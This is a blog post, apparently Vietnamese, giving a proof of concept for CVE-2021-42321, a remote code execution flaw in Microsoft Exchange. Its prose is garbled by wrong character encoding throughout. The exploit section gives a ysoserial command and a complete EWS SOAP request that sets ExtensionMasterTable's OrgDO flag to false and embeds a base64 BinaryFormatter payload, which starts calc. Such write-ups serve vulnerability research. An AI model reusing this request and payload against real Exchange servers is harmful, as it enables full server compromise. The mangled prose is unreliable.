---
title: CVE-2021-42321 Microsoft Exchange RCE
author: HoangND
date: 2021-11-20 15:00:00 +0700
categories: [PoC]
tags: [cve-2021-42321, microsoft exchange]
---

·ªû b·∫£n v√° th√°ng 11 c·ªßa Exchange, m·ªôt l·ªó h·ªïng c√≥ m√£ CVE-2021-42321 ƒë∆∞·ª£c Microsoft t·ª©c t·ªëc c·∫£nh b√°o ng∆∞·ªùi d√πng ph·∫£i nhanh ch√≥ng c·∫≠p nh·∫≠t b·∫£n v√° ƒë·ªÉ tr√°nh b·ªã khai th√°c. 
B√†i PoC chi ti·∫øt v·ªÅ qu√° tr√¨nh diff code v√† ph√¢n t√≠ch ƒë√£ c√≥ [Blog c·ªßa NCSC](https://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/), ·ªü ƒë√¢y m√¨nh ch·ªâ n√™u th√™m m·ªôt s·ªë l∆∞u √Ω v√† b∆∞·ªõc cu·ªëi trong qu√° tr√¨nh exploit.

## Exchange Web Service (EWS)
Ngo√†i hai endpoint ch√≠nh l√† /ecp v√† /owa ƒë·ªÉ qu·∫£n l√Ω c·∫•u h√¨nh v√† h·ªôp th∆∞, Exchange c√≤n c√≥ /ews cho webservice.
EWS cung c·∫•p cho ng∆∞·ªùi d√πng kh·∫£ nƒÉng giao ti·∫øp v·ªõi m√°y ch·ªß Exchange th√¥ng qua c√°c SOAP request, ƒë·ªìng nghƒ©a v·ªõi vi·ªác request v√† response ƒë∆∞·ª£c bi·ªÉu di·ªÖn d∆∞·ªõi d·∫°ng XML. 
Template XML ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a t·ª´ c√°c file schema v√† wsdl tr√™n virtual directory c·ªßa m√°y ch·ªß Exchange. C√°c t·ªáp n√†y c√≥ th·ªÉ truy c·∫≠p b·∫±ng browser qua c√°c Url d∆∞·ªõi ƒë√¢y.
- http://[yourclientaccessserver].com/ews/services.wsdl ‚Äî The location of the WSDL file.
- http://[yourclientaccessserver].com/ews/messages.xsd ‚Äî The location of the messages schema.
- http://[yourclientaccessserver].com/ews/types.xsd ‚Äî The location of the types schema.

Endpoint ƒë·ªÉ giao ti·∫øp v·ªõi m√°y ch·ªß Exchange m·∫∑c ƒë·ªãnh l√† /EWS/Exchange.asmx tuy nhi√™n tr√™n m√¥i tr∆∞·ªùng product n√™n s·ª≠ d·ª•ng __Autodiscover__ ƒë·ªÉ x√°c ƒë·ªãnh url c·ªßa ews ch√≠nh x√°c.

## User configuration
Nh∆∞ ·ªü b√†i blog c·ªßa NCSC, h√†m g√¢y ra l·ªói l√† h√†m __TryDeserialize__ c·ªßa l·ªõp __Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer__

![image](/assets/posts/cve-2021-42321/1.png)

ƒê·∫∑t debug ·ªü h√†m g√¢y l·ªói, s·ª≠ d·ª•ng ch·ª©c nƒÉng tr√™n trang add-ins ·ªü /ecp ƒë·ªÉ quan s√°t bi·∫øn userConfiguration

![image](/assets/posts/cve-2021-42321/2.png)

![image](/assets/posts/cve-2021-42321/3.png)

Quan s√°t th·∫•y userConfiguration c√≥ thu·ªôc t√≠nh ConfigurationName l√† **ExtensionMasterTable** v√† c√≥ d·∫°ng dictionary ch·ª©a 3 thu·ªôc t√≠nh OrgDO, OrgExtV, OrgChkTm. 
ƒê·ªÉ h√†m nh·∫£y v√†o ƒë∆∞·ª£c ƒëo·∫°n deserialize th√¨ tham s·ªë OrgDO c·ªßa bi·∫øn userConfiguration ph·∫£i c√≥ gi√° tr·ªã l√† false, m·∫∑c ƒë·ªãnh gi√° tr·ªã hi·ªán t·∫°i ƒëang l√† true.

Sau ƒë·∫•y c·∫ßn ti·∫øp t·ª•c t√¨m ki·∫øm c√°ch update user configuration, ƒëo·∫°n n√†y ·ªü trang [doc](https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/updateuserconfiguration-operation) c·ªßa Microsoft ƒë√£ m√¥ t·∫£ c·ª±c k·ª≥ chi ti·∫øt. ·ªû t√†i li·ªáu nh·∫Øc ƒë·∫øn ·ªü tr√™n h·ªç c≈©ng ƒë√£ cho m√¨nh m·ªôt v√≠ d·ª• ho√†n ch·ªânh v·ªÅ SOAP request, c√πng ng√≥ qua m·ªôt ch√∫t
  
```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:m="https://schemas.microsoft.com/exchange/services/2006/messages"
               xmlns:t="https://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2010" />
  </soap:Header>
  <soap:Body>
    <m:UpdateUserConfiguration>
      <m:UserConfiguration>
        <t:UserConfigurationName Name="TestConfig">
          <t:DistinguishedFolderId Id="drafts"/>
        </t:UserConfigurationName>
        <t:Dictionary>
          <t:DictionaryEntry>
            <t:DictionaryKey>
              <t:Type>String</t:Type>
              <t:Value>PhoneNumber</t:Value>
            </t:DictionaryKey>
            <t:DictionaryValue>
              <t:Type>String</t:Type>
              <t:Value>111-111-5555</t:Value>
            </t:DictionaryValue>
          </t:DictionaryEntry>
        </t:Dictionary>
      </m:UserConfiguration>
    </m:UpdateUserConfiguration>
  </soap:Body>
</soap:Envelope>
```
 
T·ª´ v√≠ d·ª• n√†y c√≥ th·ªÉ th·∫•y m·ªôt user configuration s·∫Ω c√≥ c√°c th√†nh ph·∫ßn b·∫Øt bu·ªôc l√† Name c√πng FolderId, b√™n d∆∞·ªõi l√† c√°c DictionaryEntry, c·∫•u tr√∫c n√†y kh·ªõp v·ªõi bi·∫øn userConfiguration m√¨nh ƒë√£ quan s√°t ·ªü tr√™n. Nh∆∞ v·∫≠y m√¨nh ƒë√£ bi·∫øt c√°c th√†nh ph·∫ßn l√† Name v√† DictionaryEntry, ph·∫£i c√≥ th√™m FolderId m·ªõi c√≥ th·ªÉ update ƒë∆∞·ª£c config ExtensionMasterTable. ExtensionMasterTable l√† m·ªôt config c√≥ s·∫µn tr√™n Exchange, v·∫≠y kh·∫£ nƒÉng folder c·ªßa n√≥ c≈©ng ƒë√¢u ƒë√≥ trong s·ªë nh·ªØng th·∫±ng c√≥ s·∫µn. M√¨nh th·ª≠ g·ª≠i b·ª´a m·ªôt get request ƒë·ªÉ l·∫•y th√¥ng tin c·ªßa ExtensionMasterTable

![image](/assets/posts/cve-2021-42321/4.png)

Error 500 üôÑüôÑüôÑüôÑüôÑüôÑ. ƒê·∫øn ƒë√¢y th√¨ m√¨nh ƒë√£ th·ª≠ 7 7 49 chi√™u nh∆∞ng response v·∫´n lu√¥n l√† 500, k hi·ªÉu ki·ªÉu g√¨ khi request ƒë∆∞·ª£c l·∫•y t·ª´ ch√≠nh doc. May m·∫Øn c√≥ ng∆∞·ªùi anh t·ª´ng pwn2own Exchange v·∫´n c√≤n gi·ªØ l·∫°i 1 request h·ªìi ƒë·∫•y v√† g·ª≠i cho m√¨nh test th·ª≠. It worked! but why? Sau khi h·∫øt soi n·ªïi b·∫±ng m·∫Øt th∆∞·ªùng th√¨ m√¨nh quy·∫øt ƒë·ªãnh d√πng Winmerge ƒë·ªÉ so s√°nh hai th·∫±ng v·ªõi nhau, ƒë√∫ng ra n√™n d√πng s·ªõm h∆°n üòÉ.

![image](/assets/posts/cve-2021-42321/5.png)

S·ª≠ng s·ªët kh√¥ng h·ªÅ nh·∫π khi nh·∫≠n ra kh√°c bi·ªát g√¢y ra l·ªói 500 l√† ch·ªó khai b√°o namespace, trang doc l·∫°i s·ª≠ d·ª•ng https thay v√¨ http. ü§ê C·∫°n l·ªùi ...
Tr·ªü l·∫°i v·ªõi v·∫•n ƒë·ªÅ x√°c ƒë·ªãnh FolderId, sau khi ƒë√£ gi·∫£i quy·∫øt l·ªói 500, test th·ª≠ m·ªôt s·ªë folder c√≥ s·∫µn, ngay th·∫±ng ƒë·∫ßu ti√™n ƒë√£ d√≠nh

![image](/assets/posts/cve-2021-42321/6.png)

Ngo√†i vi·ªác x√°c ƒë·ªãnh ƒë∆∞·ª£c FolderId c·ªßa ExtensionMasterTable l√† inbox, m√¨nh c√≤n c√≥ ƒë∆∞·ª£c c·∫•u tr√∫c c·ªßa n√≥ ƒë·ªÉ ƒë∆∞a v√†o request update (ƒë·ªÉ ƒë·∫£m b·∫£o kh√¥ng c√≥ v·∫•n ƒë·ªÅ g√¨ m√¨nh th∆∞·ªùng get tr∆∞·ªõc sau ƒë√≥ s·ª≠a th√¥ng tin ƒë·ªÉ ƒë∆∞a v√†o update). Update th·ª≠ ExtensionMasterTable v√† ki·ªÉm tra l·∫°i b·∫±ng get request 

![image](/assets/posts/cve-2021-42321/7.png)

·ªîn r·ªìi, debug l·∫°i th·ª≠ th√¥i. S·ª≠ng s·ªët again khi v·∫´n kh√¥ng th·ªÉ nh·∫£y v√†o ƒëo·∫°n code deserialize. Sau ƒë√≥ m√¨nh ph√°t hi·ªán ra vi·ªác s·ª≠ d·ª•ng ch·ª©c nƒÉng tr√™n trang add-ins s·∫Ω ƒë∆∞a ExtensionMasterTable s·∫Ω b·ªã ƒë∆∞a tr·ªü l·∫°i v·ªÅ gi√° tr·ªã m·∫∑c ƒë·ªãnh (OrgDO=true) khi·∫øn vi·ªác update config c·ªßa m√¨nh ƒë·∫øn ƒë√¢y tr·ªü n√™n v√¥ nghƒ©a. Nghƒ© ƒë·∫øn chuy·ªán ph·∫£i trace code v√†o s√¢u h∆°n ƒë·ªÉ x√°c ƒë·ªãnh ch·ªó ƒë∆∞a config tr·ªü v·ªÅ m·∫∑c ƒë·ªãnh l√† tr·∫ßm c·∫£m, th√¥i th√¨ m√¨nh th·ª≠ fuzz ch·ª©c nƒÉng tr∆∞·ªõc, c√≥ th·ªÉ ch·ª©c nƒÉng n√†o ƒë·∫•y s·∫Ω kh√¥ng reset config, ai bi·∫øt ƒë∆∞·ª£c ü§∑. Cu·ªëi c√πng m√¨nh ph√°t hi·ªán ra __load l·∫°i trang add-ins__ s·∫Ω kh√¥ng reset config. Nice.

## Exploit
Sau khi ƒë√£ ƒë·∫°t ƒë∆∞·ª£c m·ª•c ƒë√≠ch l√† v√†o ƒë∆∞·ª£c ƒë·∫øn ch·ªó deserialize, c·∫ßn t√¨m c√°ch r√°p m·ªôt entry v·ªõi type base64 v√†o ExtensionMasterTable + ysoserial ƒë·ªÉ exploit. Tr·ªü l·∫°i v·ªõi 3 file schema m√¥ t·∫£ c·∫•u tr√∫c xml ·ªü ph·∫ßn ƒë·∫ßu m√¨nh c√≥ nh·∫Øc ƒë·∫øn, type.xsd bi·ªÉu di·ªÖn c√°c type b√™n trong c√°c request soap. M√¨nh ƒëang c·∫ßn check type c·ªßa UserConfiguration, search lu√¥n b·∫±ng browser

![image](/assets/posts/cve-2021-42321/8.png)

B√™n trong c√°c node m·∫π s·∫Ω c√≥ th√¥ng tin c√°c node con c√≥ th·ªÉ c√≥ c√πng c·∫•p, quan s√°t th·∫•y r·∫±ng c√πng c·∫•p v·ªõi UserConfigurationName c√≥ hai node c√≥ type base64 l√† XmlData v√† BinaryData. S·ª≠ d·ª•ng m·ªôt trong hai ƒë·ªÉ ƒë∆∞a payload ysoserial v√†o b√™n trong. C√¢u l·ªánh t·∫°o payload

```bash
.\ysoserial.exe -c "calc" -g TypeConfuseDelegate -f BinaryFormatter -o base64
```

C·∫•u tr√∫c cu·ªëi c√πng c·ªßa soap request update ExtensionMasterTable

```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2010" />
  </soap:Header>
  <soap:Body>
    <m:UpdateUserConfiguration>
      <m:UserConfiguration>
        <t:UserConfigurationName Name="ExtensionMasterTable">
          <t:DistinguishedFolderId Id="inbox"/>
        </t:UserConfigurationName>
<t:BinaryData>AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAcvYyBjYWxjBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=</t:BinaryData>
        <t:Dictionary><t:DictionaryEntry><t:DictionaryKey><t:Type>String</t:Type><t:Value>OrgDO</t:Value></t:DictionaryKey><t:DictionaryValue><t:Type>Boolean</t:Type><t:Value>false</t:Value></t:DictionaryValue></t:DictionaryEntry><t:DictionaryEntry><t:DictionaryKey><t:Type>String</t:Type><t:Value>OrgExtV</t:Value></t:DictionaryKey><t:DictionaryValue><t:Type>Integer32</t:Type><t:Value>0</t:Value></t:DictionaryValue></t:DictionaryEntry><t:DictionaryEntry><t:DictionaryKey><t:Type>String</t:Type><t:Value>OrgChkTm</t:Value></t:DictionaryKey><t:DictionaryValue><t:Type>Integer64</t:Type><t:Value>637729403684086495</t:Value></t:DictionaryValue></t:DictionaryEntry></t:Dictionary>
      </m:UserConfiguration>
    </m:UpdateUserConfiguration>
  </soap:Body>
</soap:Envelope>
```

Refresh l·∫°i trang add-ins, k·∫øt qu·∫£ l√† process calc ƒë∆∞·ª£c t·∫°o

![MicrosoftTeams-image](/assets/posts/cve-2021-42321/9.png)

## REFERENCES
[https://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/](https://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/)<br/>
[https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-xml-elements-in-exchange](https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-xml-elements-in-exchange)<br/>
[https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange](https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange)

